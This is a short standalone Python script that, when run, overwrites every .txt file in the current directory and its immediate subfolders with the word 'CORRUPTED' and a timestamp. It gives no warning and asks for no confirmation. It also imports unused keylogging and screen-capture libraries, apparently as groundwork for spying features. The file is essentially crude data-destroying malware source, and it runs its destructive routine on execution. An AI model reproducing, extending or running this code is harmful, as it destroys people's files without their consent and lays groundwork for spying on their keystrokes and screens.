import os
import psutil
import keyboard
import threading
import datetime
import time
from  sys import exit
from pynput.keyboard import Key, Listener
from PIL import ImageGrab;
import cv2
import numpy as np

def setInterval(func,time):
    e = threading.Event()
    while not e.wait(time):
        func()

folders = [];

def corruptDir():
    dirs = os.listdir()
    for files in dirs:
        extension = files[len(files)-4]+files[len(files)-3]+files[len(files)-2]+files[len(files)-1];
        print(files);
        if extension == ".txt":
            f = open(files, "w")
            f.write("CORRUPTED " + str(datetime.datetime.now()))
        if '.' not in extension:
            folders.append(files)
            print("folder found : " + extension)
    print("end of corrupt dir")

def corruptFolder(folder):
    os.chdir(folder)
    dirs = os.listdir();
    for files in dirs:
        extension = files[len(files)-4]+files[len(files)-3]+files[len(files)-2]+files[len(files)-1];
        print(extension);
        if extension == ".txt":
            f = open(files, "w")
            f.write("CORRUPTED " + str(datetime.datetime.now()))
            print("end of corrupt folder")
    os.chdir("../")
#for i in range(0, 10):
#    os.mkdir("ok"+str(i))
corruptDir();
for folder in folders:
    corruptFolder(folder);


